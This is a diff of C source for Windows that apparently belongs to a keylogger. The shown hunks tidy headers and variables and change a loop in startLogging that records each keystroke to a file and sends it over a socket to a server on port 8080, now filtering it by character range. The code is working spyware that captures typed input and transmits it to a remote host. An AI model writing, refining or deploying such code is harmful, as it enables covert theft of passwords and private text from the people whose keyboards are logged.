@@ -1,8 +1,8 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
-#include <windows.h>
 #include <winsock2.h>
+#include <windows.h>
 #include <winuser.h>
 #include <ws2tcpip.h>
 
@@ -16,11 +16,8 @@ void sendMsg(int client_fd, const char *msg);
 void closeSocket(int client_fd);
 
 int main() {
-    int valread;
     int client_fd;
     struct sockaddr_in serv_addr;
-    const char *msg = "Hello from client";
-    char buffer[1024] = {0};
     WSADATA wsaData;
     serv_addr.sin_family = AF_INET;
     serv_addr.sin_port = htons(8080);
@@ -75,12 +72,14 @@ void startLogging(struct sockaddr_in *serv_addr, int client_fd) {
                     fprintf(keysPtr, "%s", text);
                     sendMsg(client_fd, text);
                 } else {
-                    char str[2];
-                    str[0] = c;
-                    str[1] = '\0';
-                    text = str;
-                    fprintf(keysPtr, "%s", text);
-                    sendMsg(client_fd, text);
+                    if (c >= 0x20 && c <= 0x6F){
+                        char str[2];
+                        str[0] = c;
+                        str[1] = '\0';
+                        text = str;
+                        fprintf(keysPtr, "%s", text);
+                        sendMsg(client_fd, text);
+                    }
                 }
             }
         }
